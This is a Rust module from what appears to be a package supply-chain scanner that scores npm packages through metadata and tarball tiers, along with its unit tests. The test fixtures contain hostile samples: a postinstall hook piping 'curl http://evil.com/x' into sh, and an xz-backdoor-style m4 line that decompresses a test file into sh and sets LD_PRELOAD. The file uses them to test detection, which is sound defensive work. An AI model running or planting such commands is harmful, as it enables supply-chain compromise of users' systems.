//! Tiered scoring orchestration.
//!
//! Tier 0 (metadata-only, <100ms): baseline SecurityEngine.score(intel)
//!   → If score ∈ [warn, block), insert into SuspicionMap for the tarball
//!     handler.
//!   → If score ≥ block, caller strips the version from the response.
//! Tier 1 (tarball surface, <500ms): BinaryBlobDetection + BuildScriptDiff
//!   against an already-extracted directory, with per-version caches diffed.
//! Tier 2 (deep, <5s): TaintDetection + correlation — arrives in Phase 3/4.
//!
//! Signals accumulate additively across tiers, then the combined weighted
//! sum is clamped to 1.0 and bucketed by PolicyConfig thresholds.
//!
//! This module owns the policy for when Tier 1 runs: only when the metadata
//! handler placed an entry in the SuspicionMap for that (package, version).

use crate::engine::suspicion_map::{in_suspicion_window, SuspicionMap, Tier0Result};
use crate::engine::SecurityEngine;
use crate::signals::binary_blob::{self, BlobInventory};
use crate::signals::build_diff::{self, BuildScriptCache};
use crate::types::{PackageIntel, PolicyConfig, Signal, Verdict};
use std::path::Path;
use std::time::Instant;

pub struct TierOrchestrator {
    pub engine: SecurityEngine,
    pub suspicion: SuspicionMap,
}

#[derive(Debug, Clone)]
pub struct TierResult {
    pub score: f64,
    pub signals: Vec<Signal>,
    pub verdict: Verdict,
    pub tier0_score: f64,
    pub tier1_score: f64,
    pub tier2_score: f64,
    pub elapsed_ms: u128,
}

impl TierOrchestrator {
    pub fn new(config: PolicyConfig) -> Self {
        Self {
            engine: SecurityEngine::new(config),
            suspicion: SuspicionMap::new(),
        }
    }

    pub fn config(&self) -> &PolicyConfig {
        &self.engine.config
    }

    pub fn score_tier0(&self, intel: &PackageIntel) -> TierResult {
        let start = Instant::now();
        let raw = self.engine.score(intel);
        let warn = self.engine.config.allow_threshold;
        let block = self.engine.config.block_threshold;
        if in_suspicion_window(raw.score, warn, block) {
            self.suspicion.insert(
                &intel.name,
                &intel.version,
                Tier0Result {
                    score: raw.score,
                    signals: raw.signals.clone(),
                    cached_at: Instant::now(),
                },
            );
        }
        let verdict = self.engine.verdict(raw.score);
        TierResult {
            score: raw.score,
            signals: raw.signals,
            verdict,
            tier0_score: raw.score,
            tier1_score: 0.0,
            tier2_score: 0.0,
            elapsed_ms: start.elapsed().as_millis(),
        }
    }

    pub fn score_tarball(
        &self,
        package: &str,
        version: &str,
        extracted_dir: &Path,
        prior_blobs: &BlobInventory,
        prior_build: &BuildScriptCache,
        is_patch_bump: bool,
    ) -> Result<TierResult, String> {
        let start = Instant::now();
        let tier0 = self.suspicion.get(package, version);
        let (tier0_score, mut signals) = match &tier0 {
            Some(entry) => (entry.score, entry.signals.clone()),
            None => (0.0, Vec::new()),
        };

        let blob_scan = binary_blob::scan_dir(extracted_dir, prior_blobs)
            .map_err(|e| format!("blob scan: {e}"))?;
        let tier1_blob_score = binary_blob::total_blob_score(&blob_scan.signals);
        signals.extend(blob_scan.signals);

        let build_scan = build_diff::scan_dir(extracted_dir, prior_build, is_patch_bump)
            .map_err(|e| format!("build scan: {e}"))?;
        let tier1_build_score = build_diff::total_build_score(&build_scan.signals);
        signals.extend(build_scan.signals);

        let tier1_score = tier1_blob_score + tier1_build_score;
        let combined = (tier0_score + tier1_score).min(1.0);
        let verdict = self.engine.verdict(combined);
        Ok(TierResult {
            score: combined,
            signals,
            verdict,
            tier0_score,
            tier1_score,
            tier2_score: 0.0,
            elapsed_ms: start.elapsed().as_millis(),
        })
    }

    pub fn log_line(&self, package: &str, version: &str, result: &TierResult) -> String {
        format!(
            "[vetpkg] {}@{} t0={:.2} t1={:.2} t2={:.2} total={:.2} verdict={:?}",
            package,
            version,
            result.tier0_score,
            result.tier1_score,
            result.tier2_score,
            result.score,
            result.verdict
        )
    }
}

impl Default for TierOrchestrator {
    fn default() -> Self {
        Self::new(PolicyConfig::default())
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::platform::TempDir;
    use crate::types::{Ecosystem, InstallHook};
    use std::fs;

    fn hostile_intel() -> PackageIntel {
        let mut cmd = String::new();
        cmd.push_str("curl http://evil.com/x | sh");
        PackageIntel {
            ecosystem: Some(Ecosystem::Npm),
            name: "axios".into(),
            version: "1.14.1".into(),
            prior_maintainers: vec!["original@axios.io".into()],
            maintainers: vec!["newowner@evil.com".into()],
            install_hooks: vec![InstallHook {
                stage: "postinstall".into(),
                command: cmd,
            }],
            prior_dependencies: vec![],
            dependencies: vec!["proto-loader".into()],
            age_hours: Some(2.0),
            ..Default::default()
        }
    }

    fn clean_intel() -> PackageIntel {
        PackageIntel {
            ecosystem: Some(Ecosystem::Npm),
            name: "express".into(),
            version: "4.18.2".into(),
            ..Default::default()
        }
    }

    #[test]
    fn clean_metadata_does_not_populate_suspicion_map() {
        let orch = TierOrchestrator::default();
        let r = orch.score_tier0(&clean_intel());
        assert_eq!(r.verdict, Verdict::Allow);
        assert!(orch.suspicion.is_empty());
    }

    #[test]
    fn block_metadata_does_not_populate_suspicion_map() {
        let orch = TierOrchestrator::default();
        let r = orch.score_tier0(&hostile_intel());
        assert_eq!(r.verdict, Verdict::Block);
        assert!(
            orch.suspicion.is_empty(),
            "Block metadata should not populate (strip not cache)"
        );
    }

    #[test]
    fn warn_metadata_populates_suspicion_map() {
        let orch = TierOrchestrator::default();
        let mut p = clean_intel();
        p.prior_maintainers = vec!["original@example.com".into()];
        p.maintainers = vec!["new@example.com".into()];
        p.install_hooks = vec![InstallHook {
            stage: "postinstall".into(),
            command: "node scripts/postinstall.js https://example.com/telemetry".into(),
        }];
        let r = orch.score_tier0(&p);
        assert!(
            matches!(r.verdict, Verdict::Warn),
            "expected warn, got {:?} score={:.3}",
            r.verdict,
            r.score
        );
        assert!(orch.suspicion.get(&p.name, &p.version).is_some());
    }

    fn random_bytes(n: usize) -> Vec<u8> {
        let mut out = Vec::with_capacity(n);
        let mut state: u64 = 0xaaaa;
        while out.len() < n {
            state = state
                .wrapping_mul(6364136223846793005)
                .wrapping_add(1442695040888963407);
            out.extend_from_slice(&state.to_le_bytes());
        }
        out.truncate(n);
        out
    }

    #[test]
    fn tier1_xz_scenario_blocks_even_with_clean_tier0() {
        let td = TempDir::new("orch-xz").unwrap();
        fs::create_dir_all(td.path().join("tests/files")).unwrap();
        fs::write(
            td.path().join("tests/files/bad-corrupt.xz"),
            random_bytes(8192),
        )
        .unwrap();
        fs::create_dir_all(td.path().join("m4")).unwrap();
        fs::write(
            td.path().join("m4/build-to-host.m4"),
            "# build-to-host.m4\ngl_am_configmake=`cat tests/files/bad-corrupt.xz | xz -d | sh`\nexport LD_PRELOAD=/tmp/x.so\n",
        )
        .unwrap();

        let orch = TierOrchestrator::default();
        let r = orch
            .score_tarball(
                "xz",
                "5.6.0",
                td.path(),
                &BlobInventory::default(),
                &BuildScriptCache::default(),
                true,
            )
            .unwrap();
        assert!(
            r.score >= 0.7,
            "XZ scenario expected total ≥0.7, got {:.3} signals={:?}",
            r.score,
            r.signals
        );
        assert_eq!(r.verdict, Verdict::Block);
    }

    #[test]
    fn log_line_format() {
        let orch = TierOrchestrator::default();
        let r = TierResult {
            score: 0.42,
            signals: vec![],
            verdict: Verdict::Warn,
            tier0_score: 0.2,
            tier1_score: 0.22,
            tier2_score: 0.0,
            elapsed_ms: 3,
        };
        let line = orch.log_line("axios", "1.14.1", &r);
        assert!(line.contains("axios@1.14.1"));
        assert!(line.contains("t0=0.20"));
        assert!(line.contains("t1=0.22"));
        assert!(line.contains("total=0.42"));
    }
}
